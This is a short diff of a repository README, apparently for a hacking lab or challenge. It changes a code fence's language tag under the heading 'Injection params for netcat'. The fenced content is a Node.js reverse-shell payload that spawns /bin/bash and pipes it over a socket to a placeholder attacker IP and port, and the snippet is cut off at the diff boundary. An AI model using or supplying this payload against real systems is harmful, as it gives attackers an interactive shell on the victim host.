@@ -13,7 +13,7 @@ This repository holds or links to all the files needed to complete or recreate t
 
 
 ## Injection params for netcat
-```
+``` javascript
 var net = require("net"), sh = require("child_process").exec("/bin/bash");
 var client = new net.Socket();
 client.connect(<Socket You are listenning on>, "<Your-IP>", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);
